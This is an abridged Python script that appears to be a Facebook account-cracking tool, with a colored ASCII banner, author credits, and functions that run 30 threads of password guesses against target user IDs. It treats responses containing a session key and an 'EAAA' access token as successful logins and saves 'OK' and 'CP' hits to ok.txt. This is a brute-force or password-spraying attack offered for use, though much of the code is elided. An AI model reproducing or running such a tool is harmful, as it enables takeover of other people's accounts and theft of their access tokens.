...
\033[1;91m     _  _____   __________  ___  _  _____  __  ___
\033[1;93m   / |/ / _ | / __/ __/  |/  / / |/ /_  |/  |/  /
 ...
 \033[1;91m /_/|_/_/ |_/___/___/_/  /_/ /_/|_/____/_/  /_/                                  
    ...
    "Alhamdulillah for everything I have, Alhamdulillah for everything I had and Alhamdulillah for everything I will have.”033[1;92m""")
		...
		print("\033[97;1m   Abir Khan")

		print("\033[92;1m        AUTHOR : NAEEM ABIR      ")
		...
		print("\033[97;1m   Naeem Abir Khan")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/profile.php?id=100000766728039')
	...
	def email(self):
		...
		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " Naeem): "%(Y,G))
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\n%s [+] NAEEM OK RESULTS SAVED IN -> ok.txt"%(G))
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;93m[CPNaeem] %s|%s\033[0;97m         "%(uid, pw))
